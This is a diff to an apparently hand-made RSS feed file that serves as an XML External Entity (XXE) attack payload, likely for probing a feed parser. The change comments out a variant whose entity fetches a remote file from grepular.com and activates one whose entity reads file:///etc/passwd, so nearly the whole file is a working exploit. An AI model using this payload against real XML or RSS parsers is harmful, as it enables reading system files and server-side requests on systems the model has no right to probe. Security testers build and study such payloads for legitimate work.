@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="UTF-8" ?>
+<!--<?xml version="1.0" encoding="UTF-8" ?>
 <!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "https://grepular.com/xxe.txt" >]>
   <rss version="2.0">
     <foo>&xxe;</foo>
@@ -12,8 +12,9 @@
         <description>New XML tutorial on W3Schools</description>
       </item>
     </channel>
-  </rss>
-<!-- <?xml version="1.0" encoding="UTF-8"?>
+  </rss>-->
+  
+ <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE title [ <!ELEMENT title ANY >
 <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
@@ -30,4 +31,4 @@
         <pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
     </item>
 </channel>
-</rss> -->
+</rss> 
